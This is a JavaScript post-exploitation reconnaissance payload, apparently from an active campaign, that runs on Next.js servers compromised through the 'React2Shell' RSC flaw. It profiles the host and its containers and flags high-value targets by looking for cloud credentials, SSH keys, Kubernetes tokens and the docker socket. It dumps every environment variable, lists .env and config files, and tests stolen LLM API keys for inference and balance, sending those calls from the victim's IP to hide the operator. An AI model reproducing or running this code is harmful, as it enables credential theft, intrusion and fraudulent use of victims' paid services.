/**
 * fast_recon.js — CVE-2025-55182 (React2Shell) Post-Exploitation Recon
 *
 * Executes on compromised Next.js / React RSC targets via the batch_output.py
 * scanner's "vm" gadget mode (eval-based JS execution).
 *
 * Returns a JSON object with host intelligence, container detection,
 * resource limits, network info, writable paths, HVT assessment,
 * and a FULL process.env dump.
 *
 * FIXED + HARDENED VERSION — fixes noted inline.
 */

(async function() {
  const os = await import('os');
  const fs = await import('fs');
  const path = await import('path');

  // --- Helpers ---
  const read = (p) => { try { return fs.readFileSync(p, 'utf8'); } catch (e) { return ''; } };
  const exists = (p) => { try { fs.accessSync(p); return true; } catch (e) { return false; } };
  const writable = (p) => { try { fs.accessSync(p, fs.constants.W_OK); return true; } catch (e) { return false; } };

  // --- Data Gathering ---
  const cpus = os.cpus();
  const mem = os.totalmem();
  const platform = os.platform();

  // 1. User & Kernel
  let user = 'unknown';
  try {
    user = os.userInfo().username;
  } catch(e) {
    user = process.env.USER || process.env.USERNAME || 'unknown';
  }

  // 2. Container Detection
  let env_type = 'METAL';

  if (process.env.KUBERNETES_SERVICE_HOST ||
      process.env.DOCKER_HOST ||
      process.env.AWS_EXECUTION_ENV ||
      process.env.DYNO ||
      exists('/.dockerenv') ||
      exists('/run/.containerenv')) {
    env_type = 'CONTAINER';
  }

  if (platform === 'linux') {
    // cgroup check
    const cgroup = read('/proc/self/cgroup');
    if (cgroup.match(/docker|kubepods|lxc|podman/i)) {
      env_type = 'CONTAINER';
    }

    // OverlayFS = container layers
    const mounts = read('/proc/self/mountinfo');
    if (mounts.match(/overlay|overlay2/i) && env_type === 'METAL') {
      env_type = 'CONTAINER (Probable)';
    }

    // FIXED: /proc/1/cgroup check (PID 1 — confirms container from init)
    if (env_type === 'METAL') {
      const cgroup1 = read('/proc/1/cgroup');
      if (cgroup1.match(/docker|kubepods|lxc|podman/i)) {
        env_type = 'CONTAINER';
      }
    }
  }

  // 3. Situational Awareness — Network Interfaces
  const nets = os.networkInterfaces();
  const ips = [];
  Object.keys(nets).forEach(k => {
    nets[k].forEach(n => {
      if (!n.internal && n.family === 'IPv4') ips.push(n.address);
    });
  });

  // 4. Writable Paths Check
  const write_checks = [os.tmpdir(), '/dev/shm', '/var/tmp', process.cwd()];
  const unique_checks = [...new Set(write_checks)];
  const writable_paths = unique_checks.filter(p => writable(p));

  // 5. AVX2 Check
  let has_avx2 = '0';
  if (cpus[0] && cpus[0].model.toUpperCase().includes('AVX2')) {
    has_avx2 = '1';
  } else if (platform === 'linux') {
    const cpuInfo = read('/proc/cpuinfo');
    if (cpuInfo.includes('avx2')) has_avx2 = '1';
  }

  // 6. HVT (High-Value Target) Logic
  // FIXED: expanded keyword set for better HVT detection
  const hvt_keywords = /AWS_|ECS_|EC2_|PRIVATE_KEY|MNEMONIC|WALLET|KEYSTORE|SEED_PHRASE|SENDGRID|MAILGUN|POSTMARK|SES_|STRIPE|TWILIO|DATABASE_URL|REDIS_URL|MONGO_URI|JWT_SECRET|ENCRYPTION_KEY|API_KEY/i;
  const is_hvt_env = Object.keys(process.env).some(k => hvt_keywords.test(k));

  // Disk-based HVT checks
  const home = os.homedir();
  const aws_creds = path.join(home, '.aws', 'credentials');
  let is_hvt_disk = exists(aws_creds);

  if (platform === 'linux') {
    is_hvt_disk = is_hvt_disk ||
      writable('/var/run/docker.sock') ||
      exists('/var/run/secrets/kubernetes.io/serviceaccount/token') ||
      exists('/root/.aws/credentials') ||
      exists('/root/.ssh/id_rsa') ||
      exists('/root/.ssh/id_ed25519');
  }

  // FIXED: also check ~/.ssh for SSH keys
  const ssh_rsa = path.join(home, '.ssh', 'id_rsa');
  const ssh_ed = path.join(home, '.ssh', 'id_ed25519');
  if (exists(ssh_rsa) || exists(ssh_ed)) {
    is_hvt_disk = true;
  }

  // 7. Container Resource Limits
  let actual_ram_mb = Math.floor(mem / 1024 / 1024).toString();
  let actual_cores = cpus.length.toString();

  if (platform === 'linux') {
    try {
      // Memory limits — cgroup v1 + v2
      let memStr = read('/sys/fs/cgroup/memory/memory.limit_in_bytes').trim();
      if (!memStr) memStr = read('/sys/fs/cgroup/memory.max').trim();

      if (memStr && memStr !== 'max') {
        const bytes = parseInt(memStr);
        if (!isNaN(bytes) && bytes > 0 && bytes < mem) {
          actual_ram_mb = Math.floor(bytes / 1024 / 1024).toString();
        }
      }

      // CPU limits — cgroup v1
      const quota = parseInt(read('/sys/fs/cgroup/cpu/cpu.cfs_quota_us').trim());
      const period = parseInt(read('/sys/fs/cgroup/cpu/cpu.cfs_period_us').trim());

      if (!isNaN(quota) && !isNaN(period) && quota > 0) {
        let cores = Math.floor(quota / period);
        actual_cores = (cores < 1 ? "0.X" : cores.toString());
      } else {
        // CPU limits — cgroup v2
        const cpuMax = read('/sys/fs/cgroup/cpu.max').trim();
        if (cpuMax) {
          const parts = cpuMax.split(' ');
          if (parts.length === 2 && parts[0] !== 'max') {
            const q = parseInt(parts[0]);
            const p = parseInt(parts[1]);
            if (!isNaN(q) && !isNaN(p)) {
              let c = Math.floor(q / p);
              actual_cores = (c < 1 ? "0.X" : c.toString());
            }
          }
        }
      }
    } catch(e) {}
  }

  // FIX #20: Capture FULL env vars for exploitation. Sanitization happens
  // at classification time (pipeline-manager.py), not at capture time.
  // Full values are needed to exploit DB URLs, API keys, etc.
  const sanitized_env = {};
  for (const [k, v] of Object.entries(process.env)) {
    sanitized_env[k] = v;
  }

  // FIXED: Add process listing (truncated) and listening ports
  let procs = 'N/A';
  let listening_ports = 'N/A';
  if (platform === 'linux') {
    try {
      // Quick process snapshot — just command names
      const procDirs = fs.readdirSync('/proc').filter(d => /^\d+$/.test(d)).slice(0, 50);
      const procList = [];
      for (const pid of procDirs) {
        try {
          const cmdline = fs.readFileSync(`/proc/${pid}/cmdline`, 'utf8').replace(/\0/g, ' ').trim();
          if (cmdline) procList.push(`${pid}:${cmdline.substring(0, 80)}`);
        } catch(e) {}
      }
      procs = procList.join('|');

      // Listening TCP ports
      const tcp = read('/proc/net/tcp').split('\n').slice(1);
      const ports = [];
      for (const line of tcp) {
        const parts = line.trim().split(/\s+/);
        if (parts.length > 2 && parts[3] === '0A') {  // 0A = LISTEN
          const hexPort = parts[1].split(':')[1];
          if (hexPort) ports.push(parseInt(hexPort, 16));
        }
      }
      listening_ports = ports.join(',');
    } catch(e) {}
  }

  // 8. On-target LLM key check (auth + inference + balance) — runs HERE on the
  //    compromised server so ALL API calls egress from the victim's IP, never
  //    the collector's. Checks every recognized LLM key in the env.
  let llm_checks = [];
  try {
    const hasFetch = typeof fetch === 'function';
    const PROVIDERS = {
      openrouter: { auth: 'https://openrouter.ai/api/v1/auth/key', balance: 'https://openrouter.ai/api/v1/auth/key', infer: 'https://openrouter.ai/api/v1/chat/completions', models: ['openai/gpt-4o-mini', 'meta-llama/llama-3.3-70b-instruct'], auth_hdr: 'Bearer' },
      deepseek:   { auth: 'https://api.deepseek.com/models', balance: 'https://api.deepseek.com/user/balance', infer: 'https://api.deepseek.com/chat/completions', models: ['deepseek-chat', 'deepseek-reasoner'], auth_hdr: 'Bearer' },
      openai:     { auth: 'https://api.openai.com/v1/models', balance: null, infer: 'https://api.openai.com/v1/chat/completions', models: ['gpt-4o-mini', 'gpt-4.1-mini'], auth_hdr: 'Bearer' },
      anthropic:  { auth: 'https://api.anthropic.com/v1/models', balance: null, infer: 'https://api.anthropic.com/v1/messages', models: ['claude-3-5-haiku-latest', 'claude-sonnet-4-5'], auth_hdr: 'x-api-key' },
      groq:       { auth: 'https://api.groq.com/openai/v1/models', balance: null, infer: 'https://api.groq.com/openai/v1/chat/completions', models: ['qwen/qwen3.6-27b', 'qwen/qwen3.8-27b'], auth_hdr: 'Bearer' },
      mistral:    { auth: 'https://api.mistral.ai/v1/models', balance: null, infer: 'https://api.mistral.ai/v1/chat/completions', models: ['mistral-small-latest', 'mistral-large-latest'], auth_hdr: 'Bearer' },
      // NOTE: an endpoint that 404s for a VALID key must not be used as the auth
      // probe. Perplexity's `GET /models` 404s while the key is live and inferring
      // (verified 2026-09-10: POST /chat/completions -> 200 with the same key), so
      // 84 perplexity keys/day were recorded "dead" and never even inference-tested.
      // Providers with auth_by_infer:true skip the status probe and let the
      // inference result decide (401/403 = dead, anything else = authenticated).
      perplexity: { auth: 'https://api.perplexity.ai/models', balance: null, infer: 'https://api.perplexity.ai/chat/completions', models: ['sonar', 'sonar-pro'], auth_hdr: 'Bearer', auth_by_infer: true },
      together:   { auth: 'https://api.together.xyz/v1/models', balance: null, infer: 'https://api.together.xyz/v1/chat/completions', models: ['meta-llama/Llama-3.3-70B-Instruct-Turbo'], auth_hdr: 'Bearer' },
      qwen:       { auth: 'https://dashscope.aliyuncs.com/compatible-mode/v1/models', balance: null, infer: 'https://dashscope.aliyuncs.com/compatible-mode/v1/chat/completions', models: ['qwen-turbo', 'qwen-plus'], auth_hdr: 'Bearer' },
      gemini:     { auth: 'https://generativelanguage.googleapis.com/v1beta/models?key={key}', balance: null, infer: 'gemini', models: ['gemini-3.6-flash', 'gemini-2.5-flash'], auth_hdr: 'key' },
    };
    const ENV_KEYS = {
      openrouter: ['OPENROUTER_API_KEY', 'OPENROUTER_KEY', 'OPENROUTER'],
      deepseek:   ['DEEPSEEK_API_KEY', 'DEEPSEEK_KEY'],
      openai:     ['OPENAI_API_KEY', 'OPENAI_KEY', 'OPENAI_PROJECT_API_KEY', 'NEXT_PUBLIC_OPENAI_API_KEY'],
      anthropic:  ['ANTHROPIC_API_KEY', 'ANTHROPIC_KEY', 'CLAUDE_API_KEY'],
      groq:       ['GROQ_API_KEY'],
      mistral:    ['MISTRAL_API_KEY'],
      perplexity: ['PERPLEXITY_API_KEY', 'PPLX_AGENT_API_KEY', 'PPLX_API_KEY'],
      together:   ['TOGETHER_API_KEY', 'TOGETHERAI_API_KEY'],
      qwen:       ['DASHSCOPE_API_KEY', 'QWEN_API_KEY', 'ALIBABA_API_KEY'],
      gemini:     ['GEMINI_API_KEY', 'GOOGLE_GEMINI_API_KEY', 'GOOGLE_GENERATIVE_AI_API_KEY', 'GOOGLE_GENAI_API_KEY', 'GOOGLE_AI_API_KEY', 'GOOGLE_AI_STUDIO_API_KEY'],
    };
    const UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36';
    const get = async (url, key, method, authHdr) => {
      const ctrl = new AbortController();
      const to = setTimeout(() => ctrl.abort(), 8000);
      try {
        // A browser UA matters: Cloudflare-fronted providers answer 403 "error code:
        // 1010" (banned browser signature) to bare agent strings.
        const headers = { 'Content-Type': 'application/json', 'User-Agent': UA };
        if (authHdr === 'Bearer') headers['Authorization'] = 'Bearer ' + key;
        else if (authHdr === 'x-api-key') { headers['x-api-key'] = key; headers['anthropic-version'] = '2023-06-01'; }
        const r = await fetch(url, { method: method || 'GET', headers, signal: ctrl.signal });
        const body = await r.text();
        return { status: r.status, body };
      } catch (e) {
        return { status: -1, body: String(e).slice(0, 200) };
      } finally {
        clearTimeout(to);
      }
    };
    const checkKey = async (provider, key) => {
      if (!hasFetch || !key || typeof key !== 'string' || key.length < 16) return null;
      const spec = PROVIDERS[provider];
      const out = { provider, auth_ok: 0, infer_ok: 0, balance: null, balance_detail: '', auth_detail: '', infer_detail: '' };
      // 1. auth — skipped for auth_by_infer providers (their status endpoint lies:
      // a 404 means "no such route", not "bad key").
      if (spec.auth && !spec.auth_by_infer) {
        const authRes = await get(spec.auth.replace('{key}', key), key, 'GET', spec.auth_hdr);
        out.auth_ok = authRes.status === 200 ? 1 : 0;
        out.auth_detail = authRes.status === 200 ? 'OK' : (authRes.body || '').slice(0, 200);
      }
      // 2. inference (minimal completion)
      let inferRes = null;
      if (spec.infer && (spec.auth_by_infer || out.auth_ok === 1)) {
        const mkHdr = (isGem) => { const h = { 'Content-Type': 'application/json', 'User-Agent': UA };
          if (isGem) return h; if (spec.auth_hdr === 'Bearer') h['Authorization'] = 'Bearer ' + key;
          else { h['x-api-key'] = key; h['anthropic-version'] = '2023-06-01'; } return h; };
        const tryInfer = (m) => fetch(
          provider === 'gemini' ? 'https://generativelanguage.googleapis.com/v1beta/models/' + m + ':generateContent?key=' + key : spec.infer,
          { method: 'POST', headers: mkHdr(provider === 'gemini'),
            body: provider === 'gemini'
              ? JSON.stringify({ contents: [{ parts: [{ text: 'Reply with exactly: OK' }] }] })
              : JSON.stringify({ model: m, max_tokens: 20, messages: [{ role: 'user', content: 'Reply with exactly: OK' }] }),
            signal: (() => { const c = new AbortController(); setTimeout(() => c.abort(), 10000); return c.signal; })() }
        ).then(r => r.text().then(t => ({ status: r.status, body: t }))).catch(e => ({ status: -1, body: String(e).slice(0, 200) }));
        for (const m of spec.models) { const rr = await tryInfer(m); if (rr.status === 200) { inferRes = rr; break; } }
        if (!inferRes) inferRes = { status: -1, body: 'all models non-200' };
        out.infer_ok = inferRes.status === 200 ? 1 : 0;
        out.infer_detail = inferRes.status === 200 ? 'OK' : (inferRes.body || '').slice(0, 200);
      }
      // 2b. auth decided by the inference attempt
      if (spec.auth_by_infer) {
        const st = inferRes ? inferRes.status : -1;
        const authed = (st !== 401 && st !== 403 && st !== -1);
        out.auth_ok = authed ? 1 : 0;
        out.auth_detail = authed
          ? 'OK (auth via inference, status ' + st + ')'
          : ('rejected: status ' + st + ' ' + ((inferRes && inferRes.body) || '').slice(0, 160));
      }
      // 3. balance (deepseek + openrouter expose a public balance endpoint)
      if (spec.balance) {
        const balRes = await get(spec.balance, key, 'GET', spec.auth_hdr);
        out.balance_status = balRes.status;
        if (balRes.status === 200) {
          try {
            const j = JSON.parse(balRes.body);
            if (provider === 'openrouter') {
              const d = j.data || {};
              const m = (x) => (x === null || x === undefined) ? '∞' : '$' + x;
              out.balance = d.limit_remaining;
              out.balance_limit = d.limit;
              out.balance_usage = d.usage;
              out.balance_detail = m(d.limit_remaining) + ' remaining / ' + m(d.limit) + ' limit / ' + m(d.usage) + ' used';
            } else if (provider === 'deepseek') {
              const b = (j.balance_infos || [{}])[0];
              out.balance = b.total_balance;
              out.balance_currency = b.currency;
              out.balance_detail = (b.total_balance || '?') + ' ' + (b.currency || 'USD') + ' (topped up ' + (b.topped_up_balance || '0') + ')';
            }
          } catch (e) {}
        }
      }
      return out;
    };
    const env = process.env;
    const jobs = [];
    for (const provider of Object.keys(ENV_KEYS)) {
      const keyName = ENV_KEYS[provider].find(n => env[n]);
      if (keyName) jobs.push(checkKey(provider, env[keyName]).then(r => r && (r.key_name = keyName, r)));
    }
    if (jobs.length) {
      const res = await Promise.all(jobs);
      llm_checks = res.filter(Boolean);
    }
  } catch(e) {}

  // --- files worth naming in the alert (operator format 2026-09-23: "📄 files: …") ---
  // Bounded: a fixed candidate list per base dir + a shallow file listing. No recursion.
  const files_found = [];
  const _cand = ['.env', '.env.local', '.env.production', '.env.staging', '.env.example', '.env.backup',
    'package.json', 'docker-compose.yml', 'docker-compose.yaml', 'next.config.js', 'next.config.mjs',
    'config.json', 'appsettings.json', 'settings.py', 'wp-config.php', 'firebase.json'];
  const _bases = [process.cwd(), '/app', '/workspace', '/var/www', '/'];
  for (const b of _bases) {
    if (files_found.length > 26) break;
    for (const c of _cand) {
      const p = path.join(b, c);
      try { if (fs.existsSync(p) && !files_found.includes(p)) files_found.push(p); } catch (e) { }
      if (files_found.length > 26) break;
    }
    try {
      for (const e of fs.readdirSync(b).slice(0, 14)) {
        const p = path.join(b, e);
        try {
          if (fs.statSync(p).isFile() && /\.(env|json|ya?ml|ini|conf|toml)$/i.test(e) && !files_found.includes(p)) files_found.push(p);
        } catch (err) { }
        if (files_found.length > 30) break;
      }
    } catch (e) { }
  }

  return {
    "platform": platform,
    "user_id": user,
    "kernel_release": os.release(),
    "hostname": os.hostname(),
    "env_type": env_type,
    "files": files_found,
    "host_cores_total": cpus.length.toString(),
    "usable_cores": actual_cores,
    "cpu_model": cpus[0] ? cpus[0].model : "unknown",
    "has_avx2": has_avx2,
    "ram_total_mb": Math.floor(mem / 1024 / 1024).toString(),
    "usable_ram_mb": actual_ram_mb,
    "ips": ips,
    "writable_paths": writable_paths,
    "cwd": process.cwd(),
    "node_version": process.version,
    "env_vars": sanitized_env,
    "env_vars_count": Object.keys(process.env).length.toString(),
    "is_hvt": (is_hvt_env || is_hvt_disk).toString(),
    "procs": procs,
    "listening_ports": listening_ports,
    "llm_checks": llm_checks,
  };
})();
